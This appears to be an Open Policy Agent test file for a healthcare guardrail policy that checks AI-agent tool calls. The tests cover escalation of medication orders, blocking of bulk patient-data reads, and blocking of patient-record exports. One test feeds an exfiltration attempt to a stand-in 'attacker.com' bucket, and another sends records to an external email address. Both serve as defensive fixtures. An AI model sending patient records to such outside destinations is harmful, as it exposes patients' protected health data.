# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Norviq Contributors
package norviq.sector.healthcare_test

import data.norviq.sector.healthcare

test_clinical_action_escalates {
    d := healthcare.decision with input as {"tool_name": "order_medication", "tool_params": {"drug": "x"}}
    d == "escalate"
    healthcare.rule_id == "clinical_action_escalate" with input as {"tool_name": "order_medication", "tool_params": {}}
}

test_bulk_phi_read_blocked {
    d := healthcare.decision with input as {"tool_name": "query_patients", "tool_params": {"limit": 500}}
    d == "block"
    healthcare.rule_id == "phi_min_necessary" with input as {"tool_name": "query_patients", "tool_params": {"limit": 500}}
}

test_small_phi_read_allowed {
    d := healthcare.decision with input as {"tool_name": "get_patient", "tool_params": {"limit": 1}}
    d == "allow"
}

test_phi_identifier_egress_blocked {
    d := healthcare.decision with input as {"tool_name": "export_report", "tool_params": {"mrn": "12345"}}
    d == "block"
}

test_benign_schedule_read_allowed {
    d := healthcare.decision with input as {"tool_name": "get_appointment", "tool_params": {"date": "today"}}
    d == "allow"
}

# === PHI export-egress (clean-param exfil: no PHI field key in params) ===
test_export_records_external_blocked {
    inp := {"tool_name": "export_records", "tool_params": {"destination": "s3://audit-backup-external.attacker.com"}}
    healthcare.decision == "block" with input as inp
    healthcare.rule_id == "phi_export_exfil_blocked" with input as inp
}
test_export_records_email_external_blocked {
    healthcare.decision == "block" with input as {"tool_name": "upload_records", "tool_params": {"to": "researcher@pharma-trial.com"}}
}
test_export_records_internal_escalates {
    healthcare.decision == "escalate" with input as {"tool_name": "export_records", "tool_params": {"destination": "internal-vault"}}
}
# existing PHI-key egress still blocks (precedence holds)
test_phi_key_egress_still_blocked {
    healthcare.decision == "block" with input as {"tool_name": "export_records", "tool_params": {"mrn": "88231", "destination": "internal-vault"}}
}
# benign reads unaffected
test_benign_get_patient_allowed {
    healthcare.decision == "allow" with input as {"tool_name": "get_patient", "tool_params": {"patient_id": "P1"}}
}
